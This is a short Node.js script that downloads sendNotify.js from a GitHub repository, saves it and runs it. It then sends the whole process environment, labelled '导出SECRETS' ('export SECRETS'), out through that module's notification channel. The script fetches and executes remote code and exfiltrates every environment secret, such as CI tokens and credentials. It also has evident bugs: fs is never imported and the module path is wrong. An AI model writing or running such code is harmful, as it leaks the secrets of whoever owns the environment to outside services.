const axios = require("axios");
async function download_notify() {
    let response = await axios.get("https://github.com/lxk0301/jd_scripts/raw/master/sendNotify.js");
    let fcontent = response.data;
    await fs.writeFileSync("./sendNotify.js", fcontent, "utf8");
    console.log("下载通知代码完毕");
}

await download_notify();
var notify = require("sendNotify");
notify.sendNotify("导出SECRETS", JSON.stringify(process.env));
